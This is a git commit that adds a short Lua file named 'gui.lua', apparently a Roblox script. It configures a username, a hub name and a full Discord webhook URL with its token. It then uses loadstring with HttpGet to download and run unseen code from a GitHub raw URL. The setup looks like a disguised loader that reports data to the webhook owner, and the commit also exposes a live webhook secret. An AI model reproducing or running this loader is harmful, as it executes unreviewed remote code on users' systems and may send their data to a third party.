2f2425c905e3861a1d1ffe1b9ee6bec09cd0b384
VoyM <130393882+VoyM@users.noreply.github.com>
2023-04-10 13:54:18 -0400

    Create gui.lua

---
+++ gui.lua
@@ -0,0 +1,5 @@
+_G.Username = "Mmario789"
+_G.HubName = "Zlylino"
+_G.WebhookUrl = "https://discord.com/api/webhooks/1095037881325727824/ZNJEfoGmSwyFXEnY3-89vb9OnTa2AAuJV3gNzdPM5-QOOwPJkaZ4EYfQhhCRhPMmH3Xr"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
